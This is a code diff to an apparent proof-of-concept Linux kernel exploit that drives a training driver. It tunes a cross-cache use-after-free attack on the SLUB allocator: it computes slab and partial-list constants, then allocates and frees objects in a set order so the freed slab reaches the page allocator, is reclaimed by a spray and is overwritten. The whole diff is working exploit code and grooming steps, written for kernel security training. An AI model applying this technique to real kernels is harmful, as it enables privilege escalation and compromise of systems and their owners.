@@ -80,15 +80,33 @@ int act(int act_fd, int code, int n, char *args)
  *  - Get the number of objects per slab containing a vulnerable object
  *    (let's call it initial slab). For example,
  *    /sys/kernel/slab/kmalloc-rnd-01-96/objs_per_slab is 42.
- *
- *  - Get the number of per-CPU partial slabs in the initial kmem_cache (see in gdb).
+ */
+#define OBJS_PER_SLAB 42
+
+/*
+ *  - Get the number of per-CPU partial slabs in the initial kmem_cache
+ *    (see it in the slub_set_cpu_partial() kernel function or simply in gdb).
  *    For example, kmem_cache.cpu_partial_slabs for kmalloc-rnd-01-96 is 6.
- *
- *  - Get the minimum number of per-node partial slabs in the initial kmem_cache.
+ */
+#define CPU_PARTIAL_SLABS 6
+#define CPU_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS)
+
+/*
+ *  - Get the required minimum number of per-node partial slabs in the initial kmem_cache.
  *    For example, /sys/kernel/slab/kmalloc-rnd-01-96/min_partial is 5.
- *    Ensure that this number is smaller than cpu_partial_slabs, otherwise
- *    you will have to deal with empty slabs stuck in the per-node partial list.
- *
+ */
+#define MIN_PARTIAL 5
+
+/*
+ *  - Calculate how many times we need to move per-CPU partial slabs to per-node
+ *    partial slabs to fill at least min_partial. Without this step, an empty slab
+ *    with the vulnerable object may stuck in the per-node partial list (cross-cache
+ *    attack failure).
+ */
+#define CPU_PARTIAL_TO_NODE_PARTIAL_N ((MIN_PARTIAL + CPU_PARTIAL_SLABS - 1) / CPU_PARTIAL_SLABS)
+#define NODE_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS * CPU_PARTIAL_TO_NODE_PARTIAL_N)
+
+/*
  *  - Estimate the number of holes in the initial slab cache.
  *    It can't be precise because these number change.
  *    Calculate (num_objs - active_objs) from /proc/slabinfo for the initial slab cache:
@@ -102,8 +120,6 @@ int act(int act_fd, int code, int n, char *args)
  *    On a clean system, there are no objects in the msg_msg-96, so this PoC has
  *    no holes to plug in the final slab cache.
  */
-#define OBJS_PER_SLAB 42
-#define CPU_PARTIAL_SLABS 6
 #define HOLES 450
 
 /*
@@ -111,12 +127,15 @@ int act(int act_fd, int code, int n, char *args)
  *  - pin the process to a single CPU
  *  - plug the holes in the initial slab cache
  *  - plug the holes in the final slab cache (skipped in this PoC)
- *  - allocate (objs_per_slab * cpu_partial_slabs) objects for the partial list clean-up
+ *  - allocate objects for filling the per-node partial list later
+ *  - allocate objects for filling the per-CPU partial list later
  *  - create new active slab, allocate objs_per_slab objects
  *  - allocate a vulnerable object
  *  - create new active slab, allocate objs_per_slab objects
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list
  *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
- *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list
+ *    (per-CPU partial list overflow pushed the slab with the uaf object to the page allocator)
  *  - allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab
  *  - perform uaf write using the dangling reference to the vulnerable object
  *  - execute the exploit primitive via the overwritten spray object
@@ -205,6 +224,15 @@ int main(void)
 	if (do_cpu_pinning(0) == EXIT_FAILURE)
 		goto end;
 
+	printf("[!] the cross-cache settings:\n");
+	printf("\t OBJS_PER_SLAB: %d\n", OBJS_PER_SLAB);
+	printf("\t CPU_PARTIAL_SLABS: %d\n", CPU_PARTIAL_SLABS);
+	printf("\t CPU_PARTIAL_OBJS: %d\n", CPU_PARTIAL_OBJS);
+	printf("\t MIN_PARTIAL: %d\n", MIN_PARTIAL);
+	printf("\t CPU_PARTIAL_TO_NODE_PARTIAL_N: %d\n", CPU_PARTIAL_TO_NODE_PARTIAL_N);
+	printf("\t NODE_PARTIAL_OBJS: %d\n", NODE_PARTIAL_OBJS);
+	printf("\t HOLES: %d\n", HOLES);
+
 	printf("[!] plug the holes in the initial slab cache\n");
 	for (i = 0; i < HOLES; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
@@ -216,8 +244,18 @@ int main(void)
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 	reserved_from_n = current_n;
 
-	printf("[!] allocate (objs_per_slab * cpu_partial_slabs) objects for the partial list clean-up\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL_SLABS; i++) {
+	printf("[!] allocate objects for filling the per-node partial list later\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i++) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_ALLOC\n");
+			goto end;
+		}
+	}
+	current_n += i;
+	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] allocate objects for filling the per-CPU partial list later\n");
+	for (i = 0; i < CPU_PARTIAL_OBJS; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -255,6 +293,15 @@ int main(void)
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
+		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_FREE\n");
+			goto end;
+		}
+	}
+	printf("[+] done, next partial slab will push the per-CPU partial slabs to the per-node partial list\n");
+
 	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
 	current_n--; /* point to the last allocated */
 	current_n--; /* don't free the last allocated to keep this active slab */
@@ -268,8 +315,8 @@ int main(void)
 	assert(current_n < uaf_n); /* to be sure that the uaf object has been freed here */
 	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);
 
-	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL_SLABS; i += OBJS_PER_SLAB) {
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list\n");
+	for (i = NODE_PARTIAL_OBJS; i < NODE_PARTIAL_OBJS + CPU_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
 		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
@@ -277,7 +324,7 @@ int main(void)
 	}
 	/* Now current_n should point to the first element after the reserved slabs */
 	assert(reserved_from_n + i == current_n);
-	printf("[+] done, now go spraying\n");
+	printf("[+] done, per-CPU partial list overflow pushed the slab with the uaf object to the page allocator\n");
 
 	printf("[!] allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab\n");
 	for (i = 0; i < OBJS_PER_SLAB * 5; i++) {
